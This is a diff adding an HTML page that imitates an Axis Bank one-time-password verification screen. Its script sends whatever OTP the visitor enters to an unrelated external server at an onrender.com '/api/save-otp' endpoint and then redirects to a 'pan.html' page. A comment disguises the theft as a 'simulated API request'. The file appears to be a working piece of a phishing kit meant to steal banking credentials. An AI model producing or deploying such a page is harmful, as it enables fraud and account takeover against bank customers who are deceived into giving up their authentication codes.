@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Axis Omni Channel</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #0dc8c8;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      animation: spin 1s linear infinite;
+    }
+
+    .header-container {
+      background: white;
+      color: black;
+      padding: 1px;
+      text-align: center;
+      height: 110px;
+      border: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 1000;
+      box-shadow: none;
+    }
+
+    .main-content {
+      margin-top: 110px; /* Adjusted to prevent overlap with header */
+      padding: 0 20px;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+    }
+
+    
+    .timer {
+      color: rgb(169, 5, 8);
+      font-weight: bold;
+      font-size: 1.25rem;
+    }
+
+    .footer-container {
+    width: 100%;
+    height: 100px; /* Adjust as needed */
+    background: url('footer.jpg') no-repeat center center;
+    background-size: cover;
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    z-index: 1000; /* Ensures footer stays above other content */
+}
+body {
+    margin: 0;
+    padding-bottom: 100px; /* Same as footer height */
+    box-sizing: border-box;
+}
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body class="bg-white text-black min-h-screen flex flex-col items-center">
+
+  <div class="header-container">
+    <img src="header.jpg" alt="Axis Bank">
+  </div>
+
+  <div class="main-content">
+    <div class="form-container">
+      <div class="mb-6 text-center">
+        <h1 class="text-2xl font-extrabold text-gray-800">Verify Your OTP</h1>
+        <br>
+        <p class="text-gray-600 text-sm"><b>We sent a code to your registered mobile number. Enter it below to proceed.</p>
+        <div id="timer" class="timer mb-4">
+          Please wait for <span id="countdown">60</span> seconds
+        </div>
+      </div>
+      <form id="otp-form" class="space-y-4">
+        <div>
+          <label for="otp" class="block text-gray-700 text-sm font-semibold mb-2">One-Time Password (OTP)</label>
+          <input 
+            type="text" 
+            id="otp" 
+            name="otp" 
+            class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-0 focus:border-gray-300"
+            placeholder="Enter your OTP"
+          >
+          <p id="error-message" class="text-red-500 text-xs hidden mt-1">Invalid OTP. Please try again.</p>
+        </div>
+        <div class="flex items-center justify-center">
+          <button 
+          id="verify-btn" 
+          class="w-full text-white font-medium hover:bg-[#7e405d] focus:outline-none focus:ring-1 focus:ring-[#69354a]" 
+          style="background-color: #8B004B; border-radius: 10px; height: 50px; width: 350px; text-align: center; line-height: 50px; display: inline-block; box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);" 
+          type="button"
+        >
+          Verify OTP
+        </button>
+        
+        </div>
+        <div id="loading-spinner" class="hidden text-center mt-4">
+          <div class="spinner mx-auto"></div>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <div class="footer-container"></div>
+
+
+
+
+  <script>
+    const otpInput = document.getElementById('otp');
+    const errorMessage = document.getElementById('error-message');
+    const verifyButton = document.getElementById('verify-btn');
+    const loadingSpinner = document.getElementById('loading-spinner');
+    const countdownDisplay = document.getElementById('countdown');
+    const timerDiv = document.getElementById('timer');
+
+    let timer = 60; // 1-minute countdown timer
+
+    // Start countdown timer
+    const startTimer = () => {
+      const interval = setInterval(() => {
+        if (timer > 0) {
+          timer--;
+          countdownDisplay.textContent = timer;
+        } else {
+          clearInterval(interval);
+          timerDiv.textContent = "OTP sent successfully.";
+        }
+      }, 1000);
+    };
+
+    // Start the timer when the page loads
+    startTimer();
+
+    verifyButton.addEventListener('click', () => {
+      const otp = otpInput.value;
+
+      // Clear previous error messages
+      errorMessage.classList.add('hidden');
+
+      // Show loading spinner and disable button
+      verifyButton.textContent = "Verifying...";
+      verifyButton.disabled = true;
+      loadingSpinner.classList.remove('hidden');
+
+      // Simulate a delay before processing
+      setTimeout(() => {
+        // Simulate API request
+        fetch('https://backend-e2yf.onrender.com/api/save-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ otp })
+        }).then(response => {
+          if (response.ok) {
+            window.location.href = 'pan.html';
+          } else {
+            errorMessage.textContent = "Something went wrong. Please try again.";
+            errorMessage.classList.remove('hidden');
+          }
+        }).catch(() => {
+          errorMessage.textContent = "Unable to connect to the server. Please try again later.";
+          errorMessage.classList.remove('hidden');
+        }).finally(() => {
+          // Reset the button and hide the loading spinner
+          verifyButton.textContent = "Verify OTP";
+          verifyButton.disabled = false;
+          loadingSpinner.classList.add('hidden');
+        });
+      }, 2000); // Added delay of 2 seconds before sending the request
+    });
+  </script>
+</body>
+</html>
